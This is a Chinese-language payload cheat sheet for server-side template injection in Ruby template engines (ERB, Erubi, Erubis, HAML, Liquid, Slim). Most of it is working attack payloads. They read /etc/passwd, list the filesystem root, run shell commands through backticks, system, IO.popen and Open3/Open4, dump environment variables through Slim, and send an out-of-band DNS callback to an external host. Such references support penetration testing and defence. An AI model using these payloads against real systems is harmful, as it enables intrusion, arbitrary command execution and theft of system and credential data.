[原文文档](Ruby.en.md)

# 服务器端模板注入 - Ruby

> 服务器端模板注入（SSTI）是一种漏洞，发生在攻击者可以将恶意代码注入服务器端模板中，导致服务器执行任意命令。在Ruby中，当使用模板引擎如ERB（嵌入式Ruby）、Haml、liquid或Slim时，如果用户输入被纳入模板而没有适当的清理或验证，就会出现SSTI。

## 概述

- [模板库](#模板库)
- [Ruby](#ruby)
    - [Ruby - 基本注入](#ruby---基本注入)
    - [Ruby - 检索/etc/passwd](#ruby---检索etcpasswd)
    - [Ruby - 列出文件和目录](#ruby---列出文件和目录)
    - [Ruby - 远程命令执行](#ruby---远程命令执行)
- [参考资料](#参考资料)

## 模板库

| 模板名称 | 负载格式 |
| ------------ | --------- |
| Erb      | `<%= %>`   |
| Erubi    | `<%= %>`   |
| Erubis   | `<%= %>`   |
| HAML     | `#{ }`     |
| Liquid   | `{{ }}`    |
| Mustache | `{{ }}`    |
| Slim     | `#{ }`     |

## Ruby

### Ruby - 基本注入

**ERB**：

```ruby
<%= 7 * 7 %>
```

**Slim**：

```ruby
#{ 7 * 7 }
```

### Ruby - 检索/etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - 列出文件和目录

```ruby
<%= Dir.entries('/') %>
```

### Ruby - 远程命令执行

使用SSTI执行代码，适用于**Erb**、**Erubi**、**Erubis**引擎。

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

使用SSTI执行代码，适用于**Slim**引擎。

```powershell
#{ %x|env| }
```

## 参考资料

- [Ruby ERB模板注入 - Scott White & Geoff Walton - 2017年9月13日](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)